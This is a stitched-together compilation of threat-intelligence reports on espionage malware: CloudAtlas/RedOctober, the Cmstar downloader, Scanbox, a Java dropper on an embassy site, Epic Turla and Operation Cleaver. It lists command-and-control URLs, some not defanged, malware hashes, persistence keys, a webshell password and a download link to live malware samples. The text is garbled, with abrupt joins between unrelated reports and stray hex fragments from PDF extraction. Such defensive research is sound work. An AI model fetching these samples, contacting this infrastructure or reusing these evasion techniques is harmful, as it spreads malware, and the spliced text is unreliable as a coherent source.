the file.We have been able to identify several RedOctober binaries that have "Rich" headers describing exactly the
same layout of VC 2010 + VC 2008 object files.Although this doesn't necessarily mean that the binaries
were created on the same development computer, they were definitely compiled using the same version of
the Microsoft Visual Studio up to the build number version and using similar project configuration.Based on observations from KSN, some
of the victims of RedOctober are also being targeted by CloudAtlas.In at least one case, the
victim's computer was attacked only twice in the last two years, with only two malicious
programs – RedOctober and Cloud Atlas.These and other details make us believe that CloudAtlas represents a rebirth of the RedOctober attacks.Conclusion

Following big announcements and public exposures of targeted attack operations, APT groups behave in a
predictable manner.Most Chinese-speaking attackers simply relocate C&C servers to a different place,
recompile the malware and carry on as if nothing happened.Other groups that are more nervous about exposure go in a hibernation mode for months or years.Some
may never return using the same tools and techniques.However, when a major cyber-espionage operation is exposed, the attackers are unlikely to completely
shut down everything.They simply go offline for some time, completely reshuffle their tools and return
with rejuvenated forces.We believe this is also the case of RedOctober, which makes a classy return with Cloud
Atlas.Cmstar Downloader: Lurid and Enfal’s New Cousin

In recent weeks, Unit 42 has been analyzing delivery documents used in spear-phishing attacks that drop
a custom downloader used in cyber espionage attacks.This specific downloader, Cmstar, is associated
with the Lurid downloader also known as ‘Enfal’.Cmstar was named for the log message ‘CM**’ used by
the downloader.Unit 42 is aware of threat actors using two toolkits – MNKit and the Tran Duy Linh toolkit – to produce
malicious documents that exploit CVE-2012-0158 in order to implant Cmstar.The Cmstar downloader
itself has several unique and interesting features, as well as substantial infrastructure overlap with other
tools worth discussing.Manual Building of Import Address Table

The Cmstar downloader starts by manually building its import address table (IAT), much like shellcode
would; however, it uses a rather unique technique.Instead of finding API function names based on their
hashed values, this malware enumerates libraries’ export address table (EAT) and searches for the name
of the API function the payload needs to load by using a character to offset array.The payload pairs
several comma-separated lists of characters with comma-separated lists of numbers.Each list of
characters consists of the set found within the API function name the payload seeks to add to its IAT,
while the corresponding list of numbers specifies the offset in the function name where those characters
should be placed.For example, if the payload has “D,e,A” paired with “0,5,19”, this results in the following
mapping:

“D” at offset 0 in API function name
“e” at offset 5 in API function name
“A” at offset 19 in API function name

The payload loads a specific Windows library’s EAT by calling the ImageDirectoryEntryToData API
function using the IMAGE_DIRECTORY_ENTRY_EXPORT flag.It then enumerates the library’s EAT to
find exported function names by checking each function name for the character and the specific offset.Once found, the payload adds the address for the specific API function to its IAT.For instance, the
payload checks the EAT of “wininet.dll” using the comparisons mentioned above to find the address to the
“DeleteUrlCacheEntryA” API function.One specific Cmstar payload that we analyzed used the
character/offsets seen in Figure 1 to locate the API functions within three different Windows libraries to
build its IAT.Character and Offset Pairs Found in Cmstar Payload and the Resulting API Function Names

Cmstar Behavior

After manually creating the IAT, Cmstar decrypts its configuration, several encrypted strings, and a piece
of shellcode.The embedded configuration contains nothing more than a URL that Cmstar uses as its
command and control (C2) location.The encrypted strings within the Trojan include fields used within the
HTTP requests that Cmstar will create to communicate with its C2 server, as well as additional strings
used to interact with the registry.The Cmstar sample associated with the MNKIT delivery document
creates the following registry key to automatically execute at system startup:

HKCU\Software\Microsoft\Windows\CurrentVersion\Run\xpsfiltsvcs: “rundll32.exe
C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\xpsfiltsvcs.dll,XpsRegisterServer”

Unit 42 found an additional encrypted registry key that would allow Cmstar to automatically start up after
reboots.However, the code does not decrypt, reference, or use the following registry key in any way, which
suggests that the malware author left this artifact in the code after swapping to the run key listed above:

HKCU\Software\Microsoft\CTF\LangBarAddIn

Cmstar also decrypts a 752-byte piece of shellcode that carries out communications with the C2 server,
specifically by sending HTTP POST requests to the following URL:

http://happy.launchtrue[.]com:8080/cgl-bin/update.cgi

It should be noted that the C2 URL contains the string ‘cgl-bin’, which visually resembles the common cgi-
bin folder used by many webservers to run server-side scripts.Unit 42 used the Palo Alto Networks
AutoFocus threat intelligence service to locate additional samples using the ‘cgl-bin’ string within URLs of
HTTP requests and found several samples of the Cmwhite tool associated with the LURID/Enfal
downloader1, as seen in Figure 2.Figure 2.Cmwhite Tools Using “cgl-bin” within HTTP Requests

Cmstar’s HTTP POST requests sent to ‘happy.launchtrue[.]com’ contain data that the Trojan gathers from
the infected machine that has the following structure:

<Windows Version number>@@<CPU Architecture (2 for x64, 1 for x86)>??<boolean for elevated
privileges>]]**<boolean if antivirus processes are found>!!<static version string>==

In one example, Unit 42 observed the following data within an analysis environment, which was then
encrypted using a single-byte XOR algorithm and a key of 0x45 before being sent to the C2 server:

510@@1??1]]**0!!150316o==

Helpfully, the malware author writes log messages to the ‘DF64159.TMP’ file, used for debugging purposes
throughout the execution of the Cmstar downloader.The log messages are abbreviated strings that
describe specific activities during the execution of the code.For instance, the downloader uses the
CreateMutex to create a mutex named ‘{53A4988C-F91F-4054-9076-220AC5EC03F3}’ to determine if
another instance of the code is running.If the downloader determines another instance of itself is
running, the code writes the string ‘CM**’ – which happens to be the basis for the name of the Trojan – to
the log file.Unit 42 created a Yara signature to detect Cmstar samples based on these debugging strings,
which is available in the appendix.Hashing Process Names

As mentioned in the behavioral analysis section, the Cmstar downloader gathers system-specific
information to send to the C2 server.One such piece of information is the existence of specific running
processes.Many malware families and tools check for the existence of antivirus, but the Cmstar tool does
so in a clever way.Rather than including a list of strings of associated processes, Cmstar enumerates the
running processes and subjects these process names to a hashing algorithm.The results of this algorithm
are then compared against three static values: 0x1E00AFA, 0xBEE091E8 and 0xD46FCDFA.If the Trojan finds processes whose hash matches the three values mentioned
earlier, it sets a boolean value (the character ‘1’) within the data sent to the C2 server and continues
carrying out its functionality.Rather than altering its activities, Cmstar only notifies the C2 server if a
system is running one of these processes, suggesting that the threat actors might employ this technique as
a filtering mechanism to ignore analysis systems and researchers.Threat Infrastructure

In order to determine the intrusion set involved with the Cmstar, Unit 42 enumerated infrastructure used
by the downloader for its C2 servers.The related infrastructure chart in Figure 3 shows a rather large
cluster of related entities with one small set of entities that do not share any related entities with the larger
cluster.Figure 3.Infrastructure and Entites Related to Cmstar

As seen in the chart above, the C2 domain ‘happy.launchtrue[.]com’ was originally registered using the
email address ‘WANGMINGHUA6@GMAIL[.]COM’.When Unit 42 used the Palo Alto Networks
AutoFocus threat intelligence service to locate additional Cmstar samples, we found several with C2
domains that also had the same original registrant:

links.dogsforhelp[.]com
three.earewq[.]com
question.eboregi[.]com
here.pechooin[.]com
sarey.phdreport[.]com
bakler.featurvoice[.]com

The only known Cmstar C2 domain not initially registered by the email address was help.ubxpi0s[.]com.Further analysis revealed that additional domains related to Cmstar C2 domains were also originally
registered using the email address ‘WANGMINGHUA6@GMAIL[.]COM’ and updated to the current
information within a few days.In addition, this was the original registrant for C2 domain used in our
Google Code blog2, indicating this registrant email is likely a re-seller, and/or someone who initially sets

up infrastructure for particular APT threat actors.forever.cowforhelp[.]com
question.shiesiido[.]com
endline.biortherm[.]com
right.marubir[.]com
baby.brabbq[.]com
lind.kruptcy[.]com

The rest of the domains related to the Cmstar infrastructure did not use the original registrant noted
above, but instead kept the same information initially used to register them.The difference in domain
registration patterns could indicate threat actor preference, or could indicate there are at least two groups
using this malware whose infrastructure at times overlaps.under.suttgte[.]com
help.ubxpi0s[.]com
finally.basiccompare[.]com
crystal.diskfunc[.]com
queenfansclub[.]com
novnitie[.]com
flash-vip[.]com
replyfunt[.]com
natcongress[.]com
keep.regebky[.]com
love.regebky[.]com

Interestingly, the updated registrant information (or original, in the cases where it wasn’t changed) for all
of the C2 domains in this blog has also been used to register scam sites, most purporting to sell knock-off
designer products like shoes, software, or cell phones.The contact emails and contact names can vary, but
the address is re-used.Blue Coat noted this pattern as well in a blog published late last year, which also
noted the  ‘WANGMINGHUA6@GMAIL[.]COM’ registrant email.3 It is not known whether the threat
actors conducting the malicious activity are also behind the scam sites.Conclusion

The Cmstar tool has several interesting features, including a previously unseen method of manually
creating its import address table using an API function name character to offset mapping techniques, and
a hashing algorithm used to find antivirus processes on an infected system.Both of these features are

noteworthy and may provide the ability to correlate future tools to the same group and/or malware
authors.The URL used by Cmstar to communicate with its C2 server, as well as significant infrastructure overlap,
show a direct relationship between the Cmstar downloader, Lurid/Enfal and Cmwhite tools.In a majority
of the cases, threat actors using the Cmstar downloader initially register the C2 domains using the email
address ‘WANGMINGHUA6@GMAIL[.]COM’ and later change the registration information to include a
different email address.Unit 42 cannot positively confirm that the threat actors control the
‘WANGMINGHUA6@GMAIL[.]COM’ email address, or if the email address belongs to a reseller that the
threat actors buy domains from to create their infrastructure; however, we do believe this is an interesting
TTP worth tracking in future infrastructure enumeration.1.THE “LURID”DOWNLOADER – Nart Villeneuve and David Sancho –

http://la.trendmicro.com/media/misc/lurid-downloader-enfal-report-en.pdf

2.Attacks on East Asia using Google Code for Command and Control – Jen Miller-Osborn and Rob
Downs — http://researchcenter.paloaltonetworks.com/2014/08/attacks-east-asia-using-google-
code-command-control/

3.Scanbox: A Reconnaissance Framework Used with Watering Hole
Attacks
A few days ago we detected a watering hole campaign in a website owned by one big industrial company.The website is related to software used for simulation and system engineering in a wide range of
industries, including automotive, aerospace, and manufacturing.The attackers were able to compromise the website and include code that loaded a malicious Javascript
file from a remote server.Pluginid 1: Enumerates software installed in the system using the technique we explained before that
affects Internet Explorer.It also checks if the system is running different versions of EMET (Enhanced
Mitigation Experience Toolkit):
Producing the list of security software on the target
Pluginid 2: Enumerates Adobe Flash versions

Pluginid 5: Enumerates Microsoft Office versions

Pluginid 6: Enumerates Acrobat Reader versions

Pluginid 8: Enumerates Java versions

Pluginid 21: Implements a “keylogger” functionality trough Javascript that logs all the keystrokes the
victim is typing inside the compromised website.While the user is browsing the compromised website, all keystrokes are being recorded and sent to the
C&C periodically.It will also send keystrokes when the user submits web forms that can potentially
include passwords and other sensitive data.As we have seen, this is a very powerful framework that gives attackers a lot of insight into the potential
targets that will help them launching future attacks against them.We have also seen several Metasploit-produced exploits that target different versions of Java in the same
IP address that hosts the Scanbox framework (122.10.9[.]109).We recommend you look for this type of activity against the following machines in your network:

      mail[.]webmailgoogle.com
      js[.]webmailgoogle.com
      122[.]10.9.109#9 Blitzanalysis: Embassy of Greece Beijing - Compromise
It's friday afternoon, I had a bit of free time and stumbled across this tweet by PhysicalDrive0 (thx!)two
hours ago and thought to give it a try to finally add a new article to this Blog (first of 2014):


https://twitter.com/PhysicalDrive0/status/479921770838102017


So, I went to Google to search for the domain of the Embassy of Greece Beijing and added the (allegedly)
malicious java file package that was found by PhysicalDrive0:




URL: http://www.grpressbeijing.com/1.jar (malicious!)Next, I loaded the 1.jar file into Java Decompiler to get the source code.It showed, that the functionality is
obfuscated in some way, e.g.the function csfn(String paramString) decrypts all strings by "removing" the
numbers of the string parameter:




csfn("64s33333e3333t333S55e666c777u5r333i534t76y2M34a55n76a88g666e44r2222") ->
setSecurityManager


There are some other obfuscation techniques, but they are not important here.Instead, the following
deobfuscated code line in the function init() gives us an idea where the actual payload is located:


Resp localResp = new Resp(csfn("234p34a55445c43654k632434234235")); -> pack


We can also see, that the java package contains a file named pack, so we open 7-Zip and unpack the file.A
quick view with a PE viewer showed, that it is a x86 PE executable not even encrypted (SHA256:
b832e4b5a4829c8df6de7b42c5cb32ef25b5ab59072b4c2a7838404cd0dd5e5f):
                             Figure 2: Payload inside Java package




                             Figure 3: Payload inside PE viewer




So, I opened IDA Pro to take a quick look at the functionality.Together with the strings of the executable,
we get a brief idea of what the purpose of this malware is.It also tries to retrieve possible AntiVirus information by
using the COM interface (dc12a687-737f-11cf-884d-00aa004b2e24 -> IWbemLocator -> SELECT *
FROM AntiVirusProduct).Furthermore, it makes use of the COM to launch an instance of Internet
Explorer (d30c1661-cdaf-11d0-8a3e-00c04fc9e26e -> IWebBrowser2), supposedly to contact its C&C
server.To verify this, we open up Wireshark and run the executable.As a result, we get the following
network information:


C&C server: defense.miraclecz.com (IP: 208.115.124.83)
HTTP GET request: /index.asp?id=50100


Also, we see that it downloads some kind of data (Base64 encoded).But first, we combine the C&C server
and the HTTP request and open the URL in our favorite Browser:
                       Figure 4: Base64 encoded (2nd) Payload
URL: defense.miraclecz.com/index.asp?id=50100


As you can see, there is a string named microsoft followed by Base64 encoded data.Side note: Is there
also a Linux equivalent?Once again, it creates several registry entries with the help of the command line tool and
creates an instance of the Internet Explorer (CoCreateInstance() -> d30c1661-cdaf-11d0-8a3e-
00c04fc9e26e) for contacting the C&C server.This time, the network information is as follows:


C&C server: buy.miraclecz.com (IP: 74.121.191.33)
URL parameters (from strings of executable):
%s/?id1=blank%d&id2=%d%d
%s/?id1=%d%d


From the code we can see, that the sample has also the ability to encode/decode data from/to Base64.The
dynamic analysis showed the malware sample contacted the C&C server, but wasn't sending any URL
parameters (id1, id2).Also the server didn't respond...The files can be downloaded here:
https://www.dropbox.com/s/ckr7p5kka62cc7s/Embassy%20of%20Greece%20-%20Beijing.zip
Password: "infected" (without "")


That's it, have a nice weekend...The Epic Turla Operation

    Technical Appendix with IOCs

Executive Summary

Over the last 10 months, Kaspersky Lab researchers have analyzed a massive cyber-espionage operation
which we call "Epic Turla".The attackers behind Epic Turla have infected several hundred computers in
more than 45 countries, including government institutions, embassies, military, education, research and
pharmaceutical companies.The attacks are known to have used at least two zero-day exploits:

      CVE-2013-5065 - Privilege escalation vulnerability in Windows XP and Windows 2003
      CVE-2013-3346 - Arbitrary code-execution vulnerability in Adobe Reader

We also observed exploits against older (patched) vulnerabilities, social engineering techniques and
watering hole strategies in these attacks.The primary backdoor used in the Epic attacks is also known as
"WorldCupSec", "TadjMakhal", "Wipbot" or "Tavdig".When G-Data published on Turla/Uroburos back in February, several questions remained unanswered.One big unknown was the infection vector for Turla (aka Snake or Uroburos).Our analysis indicates that
victims are infected via a sophisticated multi-stage attack, which begins with the Epic Turla.In time, as
the attackers gain confidence, this is upgraded to more sophisticated backdoors, such as the
Carbon/Cobra system.Sometimes, both backdoors are run in tandem, and used to "rescue" each other if
communications are lost with one of the backdoors.Once the attackers obtain the necessary credentials without the victim noticing, they deploy the rootkit
and other extreme persistence mechanisms.The attacks are still ongoing as of July 2014, actively targeting users in Europe and the Middle East.Note: A full analysis of the Epic attacks is available to the Kaspersky Intelligent Services
subscribers.Watering
holes (waterholes) are websites of interest to the victims that have been compromised by the attackers and
injected to serve malicious code.So far we haven't been able to locate any e-mail used against the victims, only the attachments.The PDF
attachments do not show any "lure" to the victim when opened, however, the SCR packages sometime
show a clean PDF upon successful installation.Some of known attachment names used in the spearphishing attacks are:

      ‫(ﺗﻤﺮ ﺟﻨ"ﻒ‬.rar (translation from Arabic: "Geneva conference.rar")
      NATO position on Syria.scr
      Note_№107-41D.pdf
      Talking Points.scr
      border_security_protocol.rar
      Security protocol.scr
      Program.scr

In some cases, these filenames can provide clues about the type of victims the attackers are targeting.The watering hole attacks

Currently, the Epic attackers run a vast network of watering holes that target visitors with surgical
precision.Some of the injected websites include:




The website of the City Hall of Pinor, Spain
A site promoting entrepreneurship in the border area of Romania
Palestinian Authority Ministry of Foreign Affairs

In total, we observed more than 100 injected websites.Currently, the largest number of injected sites is in
Romania.Here's a statistic on the injected websites:
The distribution is obviously not random, and it reflects some of the interests of the attackers.For
instance, in Romania many of the infected sites are in the Mures region, while many of the Spanish
infected sites belong to local governments (City Hall).Most of the infected sites use the TYPO3 CMS (see: http://typo3.org/), which could indicate the attackers
are abusing a specific vulnerability in this publishing platform.Injected websites load a remote JavaScript into the victim's browser:
The script "sitenavigatoin.js" is a Pinlady-style browser and plugin detection script, which in turn,
redirects to a PHP script sometimes called main.php or wreq.php.Sometimes, the attackers register the
.JPG extension with the PHP handler on the server, using "JPG" files to run PHP scripts:




Profiling script

The main exploitation script "wreq.php", "main.php" or "main.jpg" performs a numbers of tasks.We have
located several versions of this script which attempt various exploitation mechanisms.One version of this script attempts to exploit Internet Explorer versions 6, 7 and 8:
Internet Explorer exploitation script

Unfortunately, the Internet Explorer exploits have not yet been retrieved.The payload dropped by these Java exploits is the following:

MD5: d7ca9cf72753df7392bfeea834bcf992

The Java exploit use a special loader that attempts to inject the final Epic backdoor payload into
explorer.exe.The backdoor extracted from the Java exploits has the following C&C hardcoded inside:

www.arshinmalalan[.]com/themes/v6/templates/css/in.php

This C&C is still online at the moment although it redirects to a currently suspended page at
"hxxp://busandcoachdirectory.com[.]au".For a full list of C&C servers, please see the Appendix.The Epic Turla attackers are extremely dynamic in using exploits or different methods depending on what
is available at the moment.Most recently, we observed them using yet another technique coupled with
watering hole attacks.The file is a .NET application that contains an encrypted resource.This drops the malicious file with the
MD5 7731d42b043865559258464fe1c98513.This is an Epic backdoor which connects to the following C&Cs, with a generic internal ID of 1156fd22-
3443-4344-c4ffff:

hxxp://homaxcompany[.]com/components/com_sitemap/
hxxp://www.hadilotfi[.]com/wp-content/themes/profile/

A full list with all the C&C server URLs that we recovered from the samples can be found in the technical
Appendix.The Epic command-and-control infrastructure

The Epic backdoors are commanded by a huge network of hacked servers that deliver command and
control functionality.The huge network commanded by the Epic Turla attackers serves multiple purposes.For instance, the
motherships function as both exploitation sites and command and control panels for the malware.Here's how the big picture looks like:
Epic Turla lifecycle

The first level of command and control proxies generally talk to a second level of proxies, which in turn,
talk to the "mothership" server.The mothership server is generally a VPS, which runs the Control panel
software used to interact with the victims.The attackers operate the mothership using a network of
proxies and VPN servers for anonymity reasons.The mothership also work as the exploitation servers
used in the watering hole attacks, delivering Java, IE or fake applications to the victim.We were able to get a copy of one of the motherships, which provided some insight into the operation.It runs a control panel which is password protected:




Epic mothership control panel login

Once logged into the Control panel, the attackers can see a general overview of the system including the
number of interesting potential targets:




Epic control panel status overview

A very interesting file on the servers is task.css, where the attackers define the IP ranges they are
interested in.To change the file, they are using the "Task editor" from the menu.Depending on the
"tasks", they will decide whether to infect the visitors or not.In this case, we found they targeted two
ranges belonging to:

      "Country A" - Federal Government Network
      "Country B" - Government Telecommunications and Informatics Services Network

It should be noted though, the fact that the attackers were targeting these ranges doesn't necessarily mean
they also got infected.Some other unknown IPs were also observed in the targeting schedules.There is also an "except.css" file where attackers log the reasons they didn't try to exploit certain visitors.In some cases, the backdoor is
packaged together with the CVE-2013-5065 EoP exploit and heavily obfuscated.This makes the analysis
more difficult.The CVE-2013-5065 exploit allows the backdoor to achieve administrator privileges on the system and run
unrestricted.This exploit only works on unpatched Microsoft Windows XP systems.Other known detection names for the backdoor is Trojan.Wipbot (Symantec) or Tavdig.The main backdoor is about 60KB in size and implements a C&C protocol on top of normal HTTP
requests.The communication protocol uses


requests in the C&C replies, which the malware decrypts and processes.The replies are sent back to the
C&C through the same channel.The malware behavior is defined by a configuration block.The configuration block usually contains two
hard-coded C&C URLs.He have also seen one case where the configuration block contains just one URL.The configuration can also be updated on the fly by the attackers, via the C&C.The backdoor attempts to identify the following processes and, if found, it will terminate itself:

      tcpdump.exe
      windump.exe
      ethereal.exe
      wireshark.exe
      ettercap.exe
      snoop.exe
      dsniff.exe

It contains an internal unique ID, which is used to identify the victim to the C&C.Most samples, especially
old ones, have the ID 1156fd22-3443-4344-c4ffff.Once a victim is confirmed as "interesting", the
attackers upload another Epic backdoor which has a unique ID used to control this specific victim.During the first C&C call, the backdoor sends a pack with the victim's system information.All further
information sent to the C&C is encrypted with a public key framework, making decryption impossible.The
commands from the C&C are encrypted in a simpler manner and can be decrypted if intercepted because
the secret key is hardcoded in the malware.Through monitoring, we were able to capture a large amount of commands sent to the victims by the
attackers, providing an unique view into this operation.Here's a look at one of the encrypted server
replies:
Once a victim is infected and "checks in" with the server, the attackers send a template of commands:




Next, the attackers try to move through the victim's network using pre-defined or collected passwords:
Listing all .doc files recursively is also a common "theme":




In total, we have decoded several hundreds of these command packages delivered to the victims, providing
an unique insight into the inner workings of the attackers.In addition to generic searches, some very specific lookups have been observed as well.These include
searches for:

      *NATO*.msg
      eu energy dialogue*.*
      EU*.msg
      Budapest*.msg

In this case, the attackers were interested to find e-mails related to "NATO", "Energy Dialogue within
European Unition" and so on.For some of the C&C servers, the attackers implemented RSA encryption for the C&C logs, which makes it
impossible to decrypt them.This scheme was implemented in April 2014.Lateral movement and upgrade to more sophisticated backdoors

Once a victim is compromised, the attackers upload several tools that are used for lateral movement.One such tool observed in the attacks and saved as "C:\Documents and Settings\All users\Start
Menu\Programs\Startup\winsvclg.exe" is:

Name: winsvclg.exe
MD5: a3cbf6179d437909eb532b7319b3dafe
Compiled: Tue Oct 02 13:51:50 2012

This is a keylogger tool that creates %temp%\~DFD3O8.tmp.Note: the filename can change across
victims.On one Central Asian government's Ministry of Foreign Affairs victim system, the filename used
was "adobe32updt.exe".In addition to these custom tools, we observed the usage of standard administration utilities.For instance,
another tool often uploaded by the attackers to the victim's machine is "winrs.exe":
Name: winrs.exe
MD5: 1369fee289fe7798a02cde100a5e91d8

This is an UPX packed binary, which contains the genuine "dnsquery.exe" tool from Microsoft, unpacked
MD5: c0c03b71684eb0545ef9182f5f9928ca.In several cases, an interesting update has been observed -- a malware from a different, yet related family.Size: 275,968 bytes
MD5: e9580b6b13822090db018c320e80865f
Compiled: Thu Nov 08 11:05:35 2012

another example:

Size: 218,112 bytes
MD5: 071d3b60ebec2095165b6879e41211f2
Compiled: Thu Nov 08 11:04:39 2012

This backdoor is more sophisticated and belongs to the next level of cyber-espionage tools called the
"Carbon system" or Cobra by the Turla attackers.Several plugins for the "Carbon system" are known to
exist.Decoded configuration for e9580b6b13822090db018c320e80865f

Note: the command and control servers www.losguayaberos[.]com and
thebesttothbrushes[.]com have been sinkholed by Kaspersky Lab.Other packages delivered to the victims include:

MD5: c7617251d523f3bc4189d53df1985ca9
MD5: 0f76ef2e6572befdc2ca1ca2ab15e5a1

These top level packages deploy both updated Epic backdoors and Turla Carbon system backdoors to
confirmed victims, effectively linking the Epic and Turla Carbon operations together.The plugins for the Carbon system can be easily recognized as they
always feature at least two exports named:

      ModuleStart
      ModuleStop
Carbon system plugin with characteristic exports

Several Epic backdoors appear to have been designed to work as Carbon system plugins as well - they
require a specialized loader to start in victim systems that do not have the Carbon system deployed.Some modules have artifacts which indicate the Carbon system is already at version 3.x, although the
exact Carbon system version is very rarely seen in samples:




The author of the Carbon module above can be also seen in the code, as "gilg", which also authored several
other Turla modules.We are planning to cover the Turla Carbon system with more details in a future report.Language artifacts

The payload recovered from one of the mothership servers (at
newsforum.servehttp[.]com/wordpress/wp-includes/css/img/upload.php, MD5:
4dc22c1695d1f275c3b6e503a1b171f5, Compiled: Thu Sep 06 14:09:55 2012) contains two modules, a
loader/injector and a backdoor.Internally, the backdoor is named "Zagruzchick.dll":
The word "Zagruzchick" means "boot loader" in Russian.The Control panel for the Epic motherships also sets the language to codepage "1251":




Codepage 1251 is commonly used to render Cyrillic characters.There are other indications that the attackers are not native English language speakers:

      Password it´s wrong!Count successful more MAX
      File is not exists
      File is exists for edit

The sample e9580b6b13822090db018c320e80865f that was delivered to several Epic victims as an
upgraded backdoor, has the compilation code page language set to "LANG_RUSSIAN".The threat actor behind the "Epic" operation uses mainly hacked servers to host their proxies.The hacked
servers are controlled through the use of a PHP webshell.This shell is password protected; the password is
checked against an MD5 hash:




The MD5 "af3e8be26c63c4dd066935629cf9bac8" has been solved by Kaspersky Lab as the
password "kenpachi".In February 2014 we observed the Miniduke threat actor using the same backdoor
on their hacked servers, although using a much stronger password.Once again, it is also interesting to point out the usage of Codepage 1251 in the webshell, which is used to
render Cyrillic characters.There appears to be several links between Turla and Miniduke, but we will leave that for a future blogpost.Victim statistics
On some of the C&C servers used in the Epic attacks, we were able to identify detailed victim statistics,
which were saved for debugging purposes by the attackers.Our analysis indicates this is a sophisticated multi-stage infection;
which begins with Epic Turla.This is used to gain a foothold and validate the high profile victim.If the
victim is interesting, they get upgraded to the Turla Carbon system.Most recently, we observed this attack against a Kaspersky Lab user on August 5, 2014, indicating the
operation remains fresh and ongoing.Note: A full analysis of the Epic attacks is available to the Kaspersky Intelligent Services
customers.Somewhere between 23,000 and 24,000 feet an enormous explosion ejected nine
              passengers into the dark void over the Pacific Ocean.1 This aviation disaster was later determined to have
              been caused by a simple design flaw combined with the lack of corrective action.Boeing and the FAA had
  known about this problem for over one year prior to the accident.The result: nine people lost their lives.The other 337
  passengers plus 18 crew members who survived, live with the memory every day; all of it due to a highly preventable
  design flaw.As a 19-year-old young adult, I was grateful to have survived but I had no idea how that single event would
  impact my future in such a profound way.Much of my passion for cybersecurity can be directly attributed to that
  fateful day.The United Flight 811 accident proves just how important it is to detect flaws before tragedy strikes.Preventable

                                       6 f20476 f64
  disasters like this are what motivates the Cylance team to create a safer world.We do everything we can to uncover

                                  4 4
  the flaws in technologies before they damage the physical or cyber world.Our mission is simple: to protect the world.This report is an attempt to deliver on that mission.20 and professionally for more than 26 years, there is no doubt in my mind
  After tracking hackers both personally
                                   c




  that the release of the information contained in the Operation Cleaver report is vital to the security of the world’s
                                 c2




  critical infrastructure.04576696




  The focus of the Operation Cleaver report is on one particular Iranian team we’ve dubbed Tarh Andishan, the
  infrastructure they utilize, as well as their tactics, techniques and procedures.Roughly translated, “Tarh Andishan”
  means “thinkers” or “innovators”.This team displays an evolved skillset and uses a complex infrastructure to perform
  attacks of espionage, theft, and the potential destruction of control systems and networks.While our investigation is
  ongoing, and we presently have limited visibility inside many of the compromised networks, Cylance observed Tarh
  Andishan actively targeting, attacking, and compromising more than 50 victims since at least 2012.Cylance is committed to responsible disclosure and has refrained from exaggeration and embellishment in this
                        2




  report, limiting our content to only that which can be definitively confirmed.However, we have speculated on the
                       b




  possible motivations behind these attacks, given our deep knowledge and understanding of the cyber landscape.6




  We have made every effort to notify all affected entities prior to publishing this report.Additionally, all personally
                    6e




  identifiable information about the members of Operation Cleaver has been withheld.We don’t care who the adversary
                   9




  is, where they work or reside, who they’re dating or what party photos they upload to Facebook – all we care about is
                                      6
  preventing campaigns like Operation Cleaver from negatively affecting the real world.8
                                  546
  This report is for the world’s cyber defenders – never give up!............................................................. 8
    Why Expose Iran Now?6 f20476 f64
  Iran is the new China.44
                         20 the past several years, conducted a significant global surveillance
  Operation Cleaver has, over
                               c




  and infiltration campaign.To date it has successfully evaded detection by existing security
                             c2




  technologies.The group is believed to work from Tehran, Iran, although auxiliary team
                     04576696




  members were identified in other locations including the Netherlands, Canada, and the UK.The group successfully leveraged both publicly available, and customized tools to attack and
  compromise targets around the globe.The targets include military, oil and gas, energy and
  utilities, transportation, airlines, airports, hospitals, telecommunications, technology, education,
  aerospace, Defense Industrial Base (DIB), chemical companies, and governments.During intense intelligence gathering over the last 24 months, we observed the technical
                    2




  capabilities of the Operation Cleaver team rapidly evolve faster than any previously observed
                  6b




  Iranian effort.As Iran’s cyber warfare capabilities continue to morph,2 the probability of an attack
                 e




  that could impact the physical world at a national or global level is rapidly increasing.3 Their
                6




  capabilities have advanced beyond simple website defacements, Distributed Denial of Service
               9




  (DDoS) attacks, and Hacking Exposed style techniques.86
                              546
  With minimal separation between private companies and the Iranian government, their modus
  operandi seems clear: blur the line between legitimate engineering companies and state-
  sponsored cyber hacking teams to establish a foothold in the world’s critical infrastructure.Iran’s rising expertise, along with their choice of victims, has compelled us to release this report
  sooner than we would have liked in order to expose Operation Cleaver to the world.The
  evidence and indicators of compromise we provide in this report will allow potentially unaware
  victims to detect and eliminate Cleaver’s incursions into their networks.Famous
examples of these efforts include industrial sabotage via
Stuxnet (2009 - 2010), and espionage with Duqu (2009 - 2011)
as well as Flame (2012).These campaigns have targeted Iran’s
nuclear program, and oil and gas operations.Stuxnet was an
eye-opening event for Iranian authorities, exposing them to the
world of physical destruction via electronic means.Hacking campaigns sourced out of Iran are nothing new.Since the early 2000’s, the information
security industry as a whole has tracked teams like the Iranian Cyber Army, which mainly focuses
on patriotic hacking (website defacements).After the release of Stuxnet, Iran’s motivations appear
to have shifted.Retaliation for Stuxnet began almost immediately in 2011 with campaigns like the
certificate compromises of Comodo and DigiNotar.These attacks served as a warning, showcasing
the rapid evolution of Iran’s hacking skills.A major retaliation came in the form of 2012’s Shamoon campaign, which impacted RasGas and
Saudi Aramco.It’s estimated that Shamoon impacted over 30,000 computer endpoints and cost
the affected companies tens-of-thousands of hours recovering from the attacks.The direct financial
impact from this retaliation and amount of downtime experienced were staggering.Shamoon was
truly a watershed event for security defenders.It was the first glimpse into the real capabillity and
intention of Iranian cyber operations.We see the same motivation and intent here in Operation
Cleaver: establishing a beachhead for cyber sabotage.We saw further Iranian backlash in late 2012 and early 2013 in the form of Operation Ababil’s
Distributed Denial of Service (DDoS) attacks against US banks.These attacks were debilitating and
impacted the availability of online banking services.Yet more backlash was witnessed with FireEye’s
exposure of Operation Saffron Rose, an espionage campaign executed by the Ajax Security Team
in 2014.In May 2014, evidence emerged of a highly targeted waterhole attack that leveraged social
media, dubbed Operation Newscaster, which was uncovered by iSight Partners.In June 2013, Israeli Prime Minister Benjamin Netanyahu accused Iran of carrying out “non-stop”
attacks on “[Israel’s] vital national systems” including “water, power and banking”4.The following
September of 2013, the Wall Street Journal accused Iran of hacking into unclassified U.S. Navy
computers in San Diego’s NMCI (Navy Marine Corp Intranet),5 which we can confirm was part of
Operation Cleaver.6
#OPCLEAVER


  While previously reported operations attributed to Iran have largely focused on Defense Industrial
  Base (DIB) companies, the United States Federal Government, or targets in Middle Eastern countries,
  Operation Cleaver has instead focused on a wide array of targets, including energy producers
  and utilities, commercial airlines and airports, military intelligence, aerospace, hospitals, and
  even universities – with only ten of the targets based in the United States.Such broad targeting
  demonstrates to the world that Iran is no longer content to retaliate against the US and Israel alone.They have bigger intentions: to position themselves to impact critical infrastructure globally.The string cleaver is found several times in a variety of custom software used in Operation
 Cleaver, including:

 	
 	   1   Numerous references inside the namespaces of their custom bot code 				
         codenamed TinyZBot, e.g.:
 	
 	e:\projects\cleaver\trunk\zhoupin_cleaver\obj\x86\release\netscp.pdb
 	
 	
 	
     2   PDBs associated with the hacker name “Jimbp”, e.g.:

